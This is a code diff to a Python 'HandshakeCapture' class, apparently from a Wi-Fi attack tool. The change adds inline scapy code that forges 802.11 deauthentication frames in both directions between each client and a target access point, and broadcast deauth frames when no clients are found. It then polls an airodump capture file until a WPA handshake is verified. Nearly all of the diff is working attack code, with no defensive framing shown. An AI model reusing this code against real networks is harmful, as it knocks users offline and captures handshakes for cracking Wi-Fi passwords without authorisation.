@@ -591,7 +591,7 @@ class HandshakeCapture:
             return False
 
     def start_capture(self):
-        """Start handshake capture with continuous deauth and capture"""
+        """Start handshake capture with alternating deauth and listen cycles"""
         if not self.check_dependencies():
             return
 
@@ -672,40 +672,85 @@ class HandshakeCapture:
             # Wait for airodump to initialize
             time.sleep(2)
             
-            self.console.print("\n[cyan]Starting aggressive handshake capture...[/cyan]")
+            self.console.print("\n[cyan]Starting handshake capture with optimized timing...[/cyan]")
             self.console.print("[yellow]Press Ctrl+C to stop if no handshake is captured[/yellow]")
             
             cycle_count = 1
             max_cycles = 10  # Limit the number of cycles
             
             while self.running and not self.handshake_captured and cycle_count <= max_cycles:
-                self.console.print(f"\n[cyan]Deauth Cycle {cycle_count}/{max_cycles}[/cyan]")
+                self.console.print(f"\n[cyan]Cycle {cycle_count}/{max_cycles}[/cyan]")
                 
                 # Get current clients
                 clients = self.get_connected_clients()
                 
                 if clients:
                     self.console.print(f"[green]Found {len(clients)} connected clients[/green]")
-                    self.console.print("[yellow]Starting deauth and capture cycle...[/yellow]")
                     
-                    # Send deauth packets and check for handshake
-                    self.send_deauth_cycle(clients)
+                    # Short deauth burst
+                    self.console.print("[yellow]Sending quick deauth burst...[/yellow]")
+                    for client in clients:
+                        # Send just 2 deauth packets to each client
+                        deauth1 = RadioTap() / Dot11(
+                            type=0,
+                            subtype=12,
+                            addr1=client,
+                            addr2=self.target_bssid,
+                            addr3=self.target_bssid
+                        ) / Dot11Deauth(reason=7)
+                        
+                        deauth2 = RadioTap() / Dot11(
+                            type=0,
+                            subtype=12,
+                            addr1=self.target_bssid,
+                            addr2=client,
+                            addr3=self.target_bssid
+                        ) / Dot11Deauth(reason=7)
+                        
+                        sendp(deauth1, iface=self.interface, count=2, inter=0.1, verbose=False)
+                        sendp(deauth2, iface=self.interface, count=2, inter=0.1, verbose=False)
+                    
+                    # Listen for handshake
+                    self.console.print("[cyan]Listening for handshake...[/cyan]")
+                    start_time = time.time()
+                    listen_duration = 15  # Listen for 15 seconds
+                    
+                    with Progress() as progress:
+                        task = progress.add_task("[cyan]Listening...", total=listen_duration)
+                        
+                        while time.time() - start_time < listen_duration and not self.handshake_captured:
+                            # Check for handshake
+                            if os.path.exists(f"{self.capture_file}-01.cap"):
+                                if self.verify_handshake():
+                                    self.handshake_captured = True
+                                    break
+                            
+                            # Update progress
+                            progress.update(task, advance=1)
+                            time.sleep(1)
+                            
+                            # Check if clients are still connected
+                            if time.time() - start_time > 5:  # Check after 5 seconds
+                                current_clients = self.get_connected_clients()
+                                if not current_clients:
+                                    self.console.print("[yellow]No clients connected. Moving to next cycle...[/yellow]")
+                                    break
                     
                     if self.handshake_captured:
                         break
-                    
-                    # Quick check for handshake
-                    if os.path.exists(f"{self.capture_file}-01.cap"):
-                        if self.verify_handshake():
-                            self.handshake_captured = True
-                            break
-                    
-                    # Brief wait before next cycle
-                    time.sleep(2)
                 else:
                     self.console.print("[yellow]No clients currently connected. Sending broadcast deauth...[/yellow]")
-                    self.send_deauth_cycle([])  # Send broadcast deauth
-                    time.sleep(3)  # Wait for potential client connections
+                    # Send broadcast deauth
+                    broadcast_deauth = RadioTap() / Dot11(
+                        type=0,
+                        subtype=12,
+                        addr1="ff:ff:ff:ff:ff:ff",
+                        addr2=self.target_bssid,
+                        addr3=self.target_bssid
+                    ) / Dot11Deauth(reason=7)
+                    
+                    sendp(broadcast_deauth, iface=self.interface, count=5, inter=0.1, verbose=False)
+                    time.sleep(5)  # Short wait for potential client connections
                 
                 cycle_count += 1
                 if cycle_count > max_cycles:
